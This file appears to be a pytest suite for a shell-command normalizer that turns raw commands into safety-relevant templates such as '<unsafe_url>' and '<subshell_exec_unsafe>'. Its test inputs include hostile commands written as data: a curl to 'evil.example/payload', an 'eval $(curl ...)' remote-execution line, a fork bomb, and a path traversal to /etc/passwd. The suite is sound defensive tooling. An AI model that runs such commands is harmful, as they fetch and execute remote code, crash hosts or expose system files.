"""Unit tests for shell_runner.normalizer."""

import pytest

from shell_runner.normalizer import normalize

CWD = "/home/test/work"
ENV = {"HOME": "/home/test"}


@pytest.mark.parametrize(
    "raw,expected_template",
    [
        # Basic
        ("ls -la /tmp/foo", "ls <tmp_path>"),  # -la stripped (ls in SAFE_FLAG_STRIP_VERBS)
        ("cat ./README.md", "cat <cwd_path>"),
        ("head -n 50 ./log", "head <n> <cwd_path>"),  # -n stripped (head in SAFE_FLAG_STRIP_VERBS)
        ("grep 'foo bar' /tmp/log", "grep <arg> <tmp_path>"),
        ("echo $HOME", "echo <home_path>"),  # $HOME expands to known env value → path
        ("ls ~/Downloads", "ls <home_path>"),
        ("ls *.py", "ls <glob>"),
        ("echo hello > ./out.txt", "echo hello > <cwd_path>"),
        # URLs — flags stripped for curl (in SAFE_FLAG_STRIP_VERBS)
        ("curl -s https://api.github.com/repos/x/y", "curl <safe_url>"),
        ("curl -s https://evil.example/payload", "curl <unsafe_url>"),
        ("curl -s ftp://example.com/x", "curl <unsafe_url>"),
        # Pipes — safe pipe-filter segments collapsed to <safe_pipe>
        ("cat /tmp/x.json | jq '.foo'", "cat <tmp_path> | <safe_pipe>"),
        ("ls -la | head -n 20", "ls | <safe_pipe>"),  # ls flags stripped + head collapsed
        ("find /tmp -name '*.log' | xargs rm", "find <tmp_path> <arg> | xargs rm"),  # -name stripped; xargs not in SAFE_PIPE_FILTERS
        # Compound chains
        (
            "mkdir -p ./build && cd ./build && cmake ..",
            "mkdir -p <cwd_path> && cd <cwd_path> && cmake <cwd_path>",
        ),
        ("test -f ./x || touch ./x", "test -f <cwd_path> || touch <cwd_path>"),
        # Subshells
        ("echo $(date +%s)", "echo <subshell:date +<arg>>"),
        ("eval $(curl -s https://x/y)", "eval <subshell_exec_unsafe>"),
        # Heredocs
        ("cat <<EOF\nhello\nEOF", "cat <heredoc>"),
        # Process substitution
        (
            "diff <(cat a.txt) <(cat b.txt)",
            "diff <process_subst:cat <cwd_path>> <process_subst:cat <cwd_path>>",
        ),
        # Forkbomb (literal — not normalized to anything fancy)
        (":(){ :|:& };:", ":(){ :|:& };:"),
        # Numeric size suffix
        (
            "dd if=/dev/zero of=./out bs=1M count=10",
            "dd if=<system_path> of=<cwd_path> bs=<n> count=<n>",
        ),
        # Backtick subshell
        ("echo `whoami`", "echo <subshell:whoami>"),
        # Background
        ("python ./server.py &", "python <cwd_path>"),  # & stripped, segment.is_background=True
        # Redirect with append
        ("echo log >> ./logfile", "echo log >> <cwd_path>"),
        # Variable assignment + command (key=value as leading token)
        ("FOO=bar python ./x.py", "FOO=<arg> python <cwd_path>"),
        # Real-world Azure DevOps — -s stripped (curl in SAFE_FLAG_STRIP_VERBS)
        (
            "curl -s 'https://dev.azure.com/conda-forge/feedstock-builds/_apis/build/builds/1421644/logs/45'",
            "curl <safe_url>",
        ),
        # Real-world gh + jq — gh not in SAFE_FLAG_STRIP_VERBS; jq pipe collapsed
        (
            "gh pr list --json number,title | jq '.[] | select(.number > 100)'",
            "gh pr list --json number,title | <safe_pipe>",
        ),
        # Path traversal must resolve
        ("cat ./foo/../../../etc/passwd", "cat <etc_path>"),
        # Unknown verb
        ("xxd ./binary", "xxd <cwd_path>"),
    ],
)
def test_normalize_template(raw: str, expected_template: str) -> None:
    result = normalize(raw, CWD, env=ENV)
    assert (
        result.template == expected_template
    ), f"\nraw:      {raw!r}\nexpected: {expected_template!r}\nactual:   {result.template!r}"


def test_segments_for_pipe() -> None:
    r = normalize("cat /tmp/x | jq .foo", CWD, env=ENV)
    assert len(r.segments) == 2
    assert r.segments[0].verb == "cat"
    assert r.segments[0].operator_to_next == "|"
    assert r.segments[1].verb == "jq"
    assert r.segments[1].operator_to_next is None


def test_background_marker() -> None:
    r = normalize("python ./server.py &", CWD, env=ENV)
    assert len(r.segments) == 1
    assert r.segments[0].is_background is True


def test_path_traversal_warning() -> None:
    r = normalize("cat ./foo/../../../etc/passwd", CWD, env=ENV)
    assert "path_traversal_resolved" in r.parse_warnings


def test_unknown_var_warning() -> None:
    r = normalize("echo $FOOBAR_NOT_SET", CWD, env={"HOME": "/home/test"})
    assert "unknown_var" in r.parse_warnings
    assert r.template == "echo <var>"


def test_unbalanced_quotes_returns_parse_ok_false() -> None:
    r = normalize('echo "unterminated', CWD, env=ENV)
    assert r.parse_ok is False
    assert "unbalanced_quotes" in r.parse_warnings


def test_placeholders_dict_records_substitutions() -> None:
    r = normalize("cat ./a.txt ./b.txt", CWD, env=ENV)
    assert "<cwd_path>" in r.placeholders
    assert sorted(r.placeholders["<cwd_path>"]) == ["./a.txt", "./b.txt"]
